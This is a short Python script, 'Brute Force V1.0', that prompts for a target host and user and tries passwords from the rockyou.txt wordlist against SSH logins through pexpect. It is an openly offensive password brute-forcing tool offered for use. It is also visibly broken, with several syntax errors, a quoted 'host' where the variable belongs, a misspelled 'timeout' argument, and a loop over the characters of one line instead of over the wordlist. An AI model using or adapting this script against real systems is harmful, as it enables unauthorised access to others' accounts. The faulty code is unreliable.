#! /usr/bin/env python3
from sty import fg
import pexpect
def connect2SSH(host,user,pw):
    ssh_string='Continue? : Yes/No'
    con_string='ssh '+user+'@'+'host'
    child =pexpect.spawn(con_string)  
    
    msgRec=child.expect([pexpect.TIMEOUT,ssh_string,'Password: '])
    if msgRec:
        child.sendline('yes')
        msgRec=child.expect([pexpect.TIMEOUT,ssh_string,''])
        if msgRec:
            child.sendline(pw)
            child.expect(['#','/$'],timout=0.666) # Add here whatever you need  ( '<' '<<'  )
            return child

        else:
            print(fg.red+'|-| Opps, Something went wrong.. '+fg.rs) 
            exit(0)

    else:
        print(fg.red+'|-| Opps, Something went wrong.. 'fg.rs) 
        exit(0)
    
def main():
    print('Brute Force V1.0 ..')
    host,user='',''
    while host == '' or user == ''
        print('|-------------------------------------------|')
        host=input('Enter the Target Host: ')
        user=input('Enter the Target User: ')
        print('|-------------------------------------------|')
    wordlist=open('rockyou.txt','r') # Change this to your wordlist
    for pw in wordlist.readline():
        try:
            child=connect2SSH(host,user,pw[:-1])
            print(fg.blue'|+| We found a PASSWORD!: {}'.format(pw[:-1])fg.rs)
        except:
            print(fg.red'|-| Failed to Connect using.. PASSWORD USED: {}'.format(pw[:-1]+fg.rs))
            


if __name__ == "__main__":
    main()
